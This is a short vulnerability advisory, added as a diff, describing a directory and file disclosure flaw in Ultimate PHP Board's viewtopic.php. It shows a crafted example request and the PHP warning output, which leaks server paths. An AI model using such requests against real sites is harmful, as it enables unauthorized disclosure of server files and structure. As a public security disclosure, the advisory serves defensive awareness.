@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/6334/info
+
+Ultimate PHP Board (UPB) is a freely available, open source PHP Bulletin Board. It is available for the Unix and Linux operating systems.
+
+Under some circumstances, it may be possible to disclose the contents of directories. By passing a malicious request to the viewtopic.php script, UPB may return a listing of the directory. This could be futher refined to disclose the contents of selected files.
+
+Input:
+http://example.com/phorum/viewtopic.php?id=some_shit&t_id=2
+
+Output:
+Warning: Unable to access ./data_dir/some_shit.dat in
+/home/samcom/public_html/public/messageboard2/textdb.inc.php on
+line 240
+
+..
+
+Warning: Supplied argument is not a valid File-Handle resource
+in /home/samcom/public_html/public/messageboard2/textdb.inc.php
+on line 241
